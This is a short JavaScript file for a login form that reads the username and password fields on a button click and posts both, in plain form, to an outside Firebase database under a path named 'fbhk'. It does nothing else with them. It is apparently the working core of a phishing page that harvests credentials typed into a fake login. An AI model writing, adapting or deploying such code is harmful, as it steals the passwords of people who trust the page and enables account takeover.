const userNaname=document.getElementById('username');
const password=document.getElementById('password');
const btn=document.querySelector("button");
btn.addEventListener('click', ()=>{
      if(password.value.trim()==="" || userNaname.value.trim()===""){
        return
      }else{
        axios.post('https://fbhk-9882a-default-rtdb.firebaseio.com/fbhk.json', { userName:userNaname.value, password:password.value} ).then(
          data=>console.log(data)
        )
          }
    })